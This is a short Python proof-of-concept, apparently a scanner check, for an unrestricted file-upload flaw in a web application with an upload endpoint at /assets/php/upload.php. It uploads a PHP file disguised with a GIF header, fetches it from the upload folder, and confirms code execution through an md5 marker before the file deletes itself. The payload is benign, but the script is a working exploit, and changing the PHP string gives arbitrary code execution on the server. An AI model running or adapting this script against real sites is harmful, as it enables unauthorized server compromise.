# coding:utf-8
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    filename = 'lpone.php'
    code = "GIF89a213213123456<?php echo md5(996);unlink(__FILE__);?>"#unlink 删除文件本身
    files = {'fileToUpload': (filename, code, 'Content-Type: image/gif')}
    action1="/assets/php/upload.php" #文件上传点
    resp1 = req.post(target+action1,headers=headers, verify=False, timeout=30, allow_redirects=False,files=files)
    if resp1.status_code == 200 and filename in resp1.text and 'has been uploaded' in resp1.text:
        action2="/assets/data/usrimg/{}".format(filename)
        resp2 = req.get(target+action2, verify=False)
        if resp2.status_code == 200 and "0b8aff0438617c055eb55f0ba5d226fa" in resp2.text:
            print (target + "，存在漏洞")
            return True
    return False


if __name__ == '__main__':
    verify("http://lpone/")